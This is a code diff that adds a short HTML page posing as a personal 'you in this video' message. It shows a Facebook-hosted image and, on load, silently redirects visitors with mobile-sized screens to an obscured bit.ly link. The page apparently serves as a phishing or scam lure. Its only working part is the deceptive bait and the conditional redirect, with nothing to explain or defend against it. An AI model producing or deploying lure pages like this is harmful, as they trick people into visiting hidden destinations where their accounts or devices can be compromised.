@@ -1,0 +1,22 @@
+<html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>ow it's you in this video seriously</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+</head>
+<body>
+<center>
+	<div id="ocultar">
+	<a href="#">
+	<img style="width: 400px;height: 200px;" src="https://scontent.fhex3-1.fna.fbcdn.net/v/t1.0-9/70176714_113395990047699_3290989136890036224_n.jpg?_nc_cat=110&_nc_sid=85a577&_nc_eui2=AeF4WyyYFuilzL75WxK3st3VdHslJRW6s4SkDrTjb6qoueeAak3omgxJae3NZUOW66M-oZFk0lEzMyV2qBJ-yW4a7_n-eebC7A6LXF58HaYgxw&_nc_ohc=jAF4zhqmX98AX875ZCZ&_nc_ht=scontent.fhex3-1.fna&oh=e457506eb643d85b35675356918703c7&oe=5E9FF54D""></a>
+	</div>
+</center>
+<script>
+if (screen.width<=1080) {
+  window.location="https://bit.ly/2UdEjzL";
+}
+</script>
+</body>
+</html>
